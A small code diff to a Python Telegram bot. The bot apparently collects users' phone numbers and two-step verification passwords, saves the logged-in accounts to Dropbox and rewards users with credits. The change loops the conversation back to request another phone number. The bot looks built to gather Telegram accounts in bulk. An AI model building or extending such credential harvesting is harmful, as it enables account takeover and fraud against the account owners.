@@ -270,7 +270,8 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Inform the user about their credits
         await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
 
-        return ConversationHandler.END
+        await update.message.reply_text("Please send another phone number (or /cancel to exit).")
+        return ASK_PHONE
     except errors.PasswordHashInvalidError:
         await update.message.reply_text("❌ Incorrect password. Please send again.")
         return ASK_PASSWORD
